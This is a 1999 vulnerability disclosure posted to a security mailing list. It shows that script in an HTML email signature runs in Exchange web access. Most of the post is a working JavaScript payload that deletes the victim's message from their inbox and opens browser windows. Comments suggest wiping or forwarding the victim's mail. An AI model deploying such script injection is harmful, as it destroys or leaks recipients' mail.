Date: Fri, 5 Mar 1999 11:30:56 -0000 
From: Mat Newman <Mat@and.co.uk>
To: "'packetstorm@genocide2600.com'" <packetstorm@genocide2600.com>
Subject: Exchange server web access


You may have heard about this but...

If someone is accessing Exchange server via the web then you can embed
javascript into the email to get it to delete the contents of the users
inbox.  If they're not using the web but just ordinary Outlook then you can
still do things like open up 10,000 browser windows etc. - useful for
spammers!)

The simplest way to do this if you're using exchange is to put the js into
your signature (it's not in the one below!) as follows:  (in
winnt\profiles\user\Application Data\Microsoft\Shared\Signatures)

<!DOCTYPE HTML PUBLIC "-//W3C//DTD W3 HTML//EN">
<html>

<head>
<meta content="text/html; charset=iso-8859-1" http-equiv="Content-Type">
<meta content="Microsoft FrontPage 3.0" name="GENERATOR">
<title></title>
</head>

<body>

<p><font face="Arial" size="2">!!!CAUTION VIRUS VERSION!!!</font></p>

<p><font face="Arial" size="2">Mat Newman</font> <br>
<script>
<!--

// Here we check to see if we're using IE4 web access

if (window.opener == null){
 alert("You are using Outlook!");
 myWin =
window.open("http://www.doodie.com/index.cfm?daily=140","","width=800,height
=500,status=yes,toolbar=yes,menubar=yes");
// Wouldn't it be annoying if I opened up 10,000 browsers?
}else{

// Check to see which message we are...

 var msg_us_index = 0;
 var msg_us_id = window.top.name;
 for (var i = 0; i<window.opener.msg_fr.deleteform.length; i++){
   if (window.opener.msg_fr.deleteform.elements[i].value == msg_us_id){
     msg_us_index = i;
     i = 100000;
   }
 }

// Here we delete ourselves
alert("Now you see me, now you don't!");
// Check the delete box for the latest message
  window.opener.msg_fr.deleteform.elements[msg_us_index].checked = true;
// Now do the deletion
  window.opener.msg_fr.deleteform.submit();
// Now shut us down
  window.close();

// We could simply have checked all the delete boxes to clear the inbox.
Perhaps we could forward them on first...

} // Check on Web Access
//-->
</script><font face="Arial" size="1">Alpha-Numeric Developments
Limited</font> <br>
</body>
</html>

